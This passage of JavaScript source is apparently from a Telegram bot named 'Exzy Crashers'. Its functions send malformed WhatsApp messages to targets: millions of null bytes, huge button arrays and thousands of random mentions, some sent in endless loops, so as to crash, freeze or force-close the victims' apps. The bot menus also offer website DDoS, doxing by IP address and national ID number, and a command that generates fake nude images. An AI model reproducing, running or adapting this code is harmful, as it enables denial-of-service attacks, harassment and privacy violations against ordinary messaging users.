    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  };

  try {
    for (const msg of nangleys) {
      await sock.relayMessage("status@broadcast", msg, relayOptions);
    }
    await sock.relayMessage("status@broadcast", nangleys2, relayOptions);
    console.log(`✅ XTridelayinfiniy success to ${target}`);
  } catch (error) {
    console.error(`❌ XTridelayinfiniy failed to ${target}:`, error.message);
  }
}

async function KhasJawaDelayHard(sock, target) {
  while (true) {
    const msg = {
      groupStatusMessageV2: {
        interactiveResponseMessage: {
          body: {
            text: "FaiqOffc"
          },
          nativeFlowMessage: {
            buttons: [
              ...Array.from({ length: 21000 }, () => ({
                name: "voice_call",
                buttonParamsJson: "\0".repeat(2000000)
              })),
              {
                name: "\0".repeat(1000000),
                buttonParamsJson: "{}"
              }
            ]
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target }
    });
  }
}

async function FaiqForclose(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        caption: "FaiqOffc Attack You",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "FaiqOffc Attack You",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                display_text: "{".repeat(1045000),
                copy_code: "\0".repeat(500000)
              })
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              conversionPointSource: "cta_copy"
            }
          }
        }
      }
    },
    {}
  );
}

async function KhasJawaForclose(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        caption: "FaiqOffc Attack You",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "FaiqOffc Is Here",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permissiom_request",
              paramsJson: "\u0010".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              conversionPointSource: "call_permissiom_request"
            }
          }
        }
      }
    },
    {}
  );
}

async function DelayGroup(sock, groupJid) {
    while (true) {
        try {
            const MsgNew = {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "Cinta kontol bikin sakit hati anjing🥴",
                                format: "Gren.DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "cta_url",
                                paramsJson: `{"flow_cta":"${"A".repeat(800000)}"}`,
                                url: "https://mmg.whatsapp.net",
                                merchantUrl: "t.me/GrenTzy",
                                version: 3
                            },
                            extendedTextMessage: {
                                text: "B".repeat(400000) + "C".repeat(400000),
                                contextInfo: {
                                    stanzaId: groupJid,
                                    participant: groupJid,
                                    quotedMessage: {
                                        conversation: "𑇂𑆵ꦾꦾꦾ𑆴" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000)
                                    },
                                    disappearingMode: {
                                        initiator: "CHANGED_IN_CHAT",
                                        trigger: "CHAT_SETTING"
                                    },
                                    stickerMessage: {
                                        paymentInviteMessage: {
                                            serviceType: 4,
                                            expiryTimestamp: Date.now() + 9007199254740991
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            };

            await sock.relayMessage(groupJid, MsgNew, {});

            console.log(`GrenTzy Cinta kontol successfully spammed to ${groupJid}`);

            await new Promise(resolve => setTimeout(resolve, 1500));

        } catch (e) {
            console.log("❌ Error Strike:", e);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}
// =========================================================

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// ======================== LOCK/UNLOCK COMMAND BUG ========================
const bugCommands = [
  "/delay", "/blank", "/freeze", "/forceClose",
  "/iosDelay", "/iosBlank", "/iosFc", "/iosFreeze",
  "/DelayHard", "/DelayInvis"
];
let commandLocks = {};
for (const cmd of bugCommands) commandLocks[cmd] = false;
function getStatus(cmd) { return commandLocks[cmd] ? "OFF" : "ONN"; }

bot.onText(/\/lock (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const cmd = match[1].trim();
  if (!bugCommands.includes(cmd)) return bot.sendMessage(chatId, `❌ Command ${cmd} tidak dikenal.`);
  if (commandLocks[cmd]) return bot.sendMessage(chatId, `⚠️ ${cmd} sudah OFF.`);
  commandLocks[cmd] = true;
  bot.sendMessage(chatId, `🔒 ${cmd} sekarang OFF (terkunci).`);
});

bot.onText(/\/unlock (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const cmd = match[1].trim();
  if (!bugCommands.includes(cmd)) return bot.sendMessage(chatId, `❌ Command ${cmd} tidak dikenal.`);
  if (!commandLocks[cmd]) return bot.sendMessage(chatId, `⚠️ ${cmd} sudah ONN.`);
  commandLocks[cmd] = false;
  bot.sendMessage(chatId, `🔓 ${cmd} sekarang ONN (terbuka).`);
});

bot.onText(/\/listlock/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const locked = bugCommands.filter(cmd => commandLocks[cmd]);
  if (locked.length === 0) return bot.sendMessage(chatId, "✅ Semua command dalam keadaan ONN (terbuka).");
  bot.sendMessage(chatId, `🔒 Command terkunci (OFF):\n${locked.map(c => `• ${c}`).join('\n')}`);
});
// START
function getMediaByType(type) {
  const mediaPath = path.join(__dirname, 'media');
  if (type === 'photo') return { type: 'photo', stream: fs.createReadStream(path.join(mediaPath, 'photo.jpg')) };
  if (type === 'video') return { type: 'video', stream: fs.createReadStream(path.join(mediaPath, 'video.mp4')) };
  if (type === 'gif') return { type: 'gif', stream: fs.createReadStream(path.join(mediaPath, 'gif.mp4')) };
  return { type: 'photo', stream: null };
}

function buildKeyboard(style, baseType = 'kece') {
  if (baseType === 'simple') {
    return {
      inline_keyboard: [
    [
      { text: "XBUGS", callback_data: "trashmenu", style: style },
      { text: "XSETTINGS", callback_data: "menu", style: style }
    ],
    [
      { text: "XTHANKS", callback_data: "TqTo", style: style },
    ]
      ]
    };
  } else {

    return {
      inline_keyboard: [
    [
      { text: "XBUGS", callback_data: "trashmenu", style: style },
      { text: "XSETTINGS", callback_data: "menu", style: style }
    ],
    [
      { text: "XTHANKS", callback_data: "TqTo", style: style },
      { text: "XTOOLS", callback_data: "menuTools", style: style }
    ],
    [
      { text: "DEVELOPERS", url: "https://t.me/yteamlowhh", style: style }
    ],
      ]
    };
  }
}

function getUserStyle(mode) {
  if (mode === "color_red") return "danger";
  if (mode === "color_green") return "success";
  if (mode === "color_yellow") return "primary";
  return "primary";
}

function startDisco(chatId, messageId) {
  stopDisco(chatId);
  const styles = ["primary", "danger", "success"];
  let index = 0;
  keyboardIntervals[chatId] = setInterval(() => {
    index = (index + 1) % styles.length;
    const keyboard = buildKeyboard(styles[index], userBase[chatId] || 'kece');
    bot.editMessageReplyMarkup(keyboard, { chat_id: chatId, message_id: messageId }).catch(() => {});
  }, 2000);
}

function stopDisco(chatId) {
  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
    delete keyboardIntervals[chatId];
  }
}


function getMainCaptionRaw(senderId) {
  const runtime = getBotRuntime();
  const developer = "@yteamlowhh";
  const memory = formatMemory();
  const cooldown = checkCooldown(senderId);
  const premiumStatus = getPremiumStatus(senderId);
  return `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : ${developer}
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${memory}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${runtime}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${premiumStatus}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : ${cooldown} sᴇᴄᴏɴᴅs

✦••┈┈ ( ☠️ ) - 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐒𝐲𝐬𝐭𝐞𝐦 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
𖥊. -  ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇᴅ  

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;
}

const captionTrashmenu = `BUG TYPE

Silahkan Memilih Bug Dibawah Ini
@yteamlowhh

/lock => untuk mengunci command
/unlock => untuk membuka command
/listlock => untuk melihat berapa command yang di kunci

⚠️ Status : ACTIVE`;

function getTrashmenu2Caption() {
  return `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds

✦••┈┈ - 𝐀𝐧𝐝𝐫𝐨 𝐁𝐮𝐠𝐬 𝐁𝐞𝐛𝐚𝐬 𝐒𝐩𝐚𝐦  - ┈┈••✦
/delay        : ${getStatus("/delay")}
/blank        : ${getStatus("/blank")}
/freeze       : ${getStatus("/freeze")}
/forceClose   : ${getStatus("/forceClose")}

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;
}

function getIosBugSpamCaption() {
  return `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds

✦••┈┈ - 𝐈𝐨𝐬 𝐁𝐮𝐠𝐬 𝐁𝐞𝐛𝐚𝐬 𝐒𝐩𝐚𝐦 - ┈┈••✦
/iosDelay     : ${getStatus("/iosDelay")}
/iosBlank     : ${getStatus("/iosBlank")}
/iosFc        : ${getStatus("/iosFc")}
/iosFreeze    : ${getStatus("/iosFreeze")}

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;
}

function getAndroBebasSpamCaption() {
  return `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds

✦••┈┈ - 𝐀𝐧𝐝𝐫𝐨 𝐁𝐮𝐠𝐬 - ┈┈••✦
/DelayHard    : ${getStatus("/DelayHard")}
/DelayInvis   : ${getStatus("/DelayInvis")}

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;
}

const captionMenuTools = `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds 

✦••┈┈ - 𝐇𝐚𝐯𝐞𝐅𝐮𝐧 𝐌𝐞𝐧𝐮 𝕺𝖓𝖊 - ┈┈••✦
─ #- 𝕿𝖔𝖔𝖑𝖘 𝖒𝖊𝖓𝖚° ─( 🛠 )
┃☰. - /ddoswebsite « Url »
〢-╰➤ ° ↯ Attack Website ¡
┃☰. - /fixcode « Reply Code »
〢-╰➤ ° ↯ Fixing Code Error ¡
┃☰. - /play « Song Name »
〢-╰➤ ° ↯ Search Music ¡
┃☰. - /ssiphone « Query »
〢-╰➤ ° ↯ Screenshot WhatsApp Ip ¡
┃☰. - /addfiture « Reply Code »
〢-╰➤ ° ↯ Add New Fitures ¡
┃☰. - /removebg « Reply Image »
〢-╰➤ ° ↯ Delete Baground Image ¡
┃☰. - /watermark « Reply Image »
〢-╰➤ ° ↯ Adding Watermark to Photos ¡
┃☰. - /tiktokdl « Url »
〢-╰➤ ° ↯ Download Media Tiktok ¡
┃☰. - /instagramdl « Url »
〢-╰➤ ° ↯ Download Media Instagram ¡
┃☰. - /pinterest « Query »
〢-╰➤ ° ↯ Search Image From Pinterest ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;

const captionGroupMenu = `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds

─ #- 𝕲𝖗𝖚𝖕𝖒𝖊𝖓𝖚° ─( 👥 )
┃☰. - /promote « Reply Users »
〢-╰➤ ° ↯ Promote Users In Groups ¡
┃☰. - /demote « Reply Users »
〢-╰➤ ° ↯ Demote Users In Groups ¡
┃☰. - /setwelcome « Text / Photo »
〢-╰➤ ° ↯ Custom Text Welcome ¡
┃☰. - /welcome « on|off »
〢-╰➤ ° ↯ Settings On / Offline Welcome ¡
┃☰. - /kick « Reply Users »
〢-╰➤ ° ↯ Kick Users From Groups ¡
┃☰. - /warn « Reply Users »
〢-╰➤ ° ↯ Giving A Warning ¡
┃☰. - /unwarn « Reply Users »
〢-╰➤ ° ↯ Delete A Warning ¡
┃☰. - /addblocklist « Text »
〢-╰➤ ° ↯ Add Forbidden Words ¡
┃☰. - /delblocklist « Text »
〢-╰➤ ° ↯ Delete Forbidden Words ¡
┃☰. - /blocklist 
〢-╰➤ ° ↯ See All Blocklist ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;

const captionToolsTwo = `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds

─ #- 𝕿𝖔𝖔𝖑𝖘° ─( 🛠 )
┃☰. - /restart
〢-╰➤ ° ↯ Restart Bot Telegram ¡
┃☰. - /autoUpdate
〢-╰➤ ° ↯ AutoUpdate index.js File ¡
┃☰. - /chatowner « Text »
〢-╰➤ ° ↯ Message Owner From Bot ¡
┃☰. - /sticker « Reply Image »
〢-╰➤ ° ↯ Convert Image To Sticker ¡
┃☰. - /getcode « Url »
〢-╰➤ ° ↯ Fetch HTML Code ¡
┃☰. - /enchtml - Reply File
〢-╰➤ ° ↯ Locking HTML Code ¡
┃☰. - /tourl « Reply Image »
〢-╰➤ ° ↯ Upload Image To Link ¡
┃☰. - /brat « Text »
〢-╰➤ ° ↯ Sticker Brat ¡
┃☰. - /testfunction « Reply Function »
〢-╰➤ ° ↯ Testing To Function ¡
┃☰. - /tonaked « Reply Image »
〢-╰➤ ° ↯ To Naked Girls ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;

const captionDoxing = `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds

─ #- 𝕯𝖔𝖝𝖏𝖓𝖌° ─( 🔍 )
┃☰. - /trackip « IP Adress »
〢-╰➤ ° ↯ Search Information IP Adress ¡
┃☰. - /nikparse « NIK »
〢-╰➤ ° ↯ Search Information NIK ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;

const captionTqTo = `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟl : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds

─ #- 𝕿𝖍𝖆𝖓𝖐𝖘 𝖙𝖔° ─( 🫀 )
┃☰. @yteamlowhh
〢-╰➤ ° ↯ ᴅᴇᴠᴇʟᴏᴘᴇʀ
┃☰. @argaXoficialll
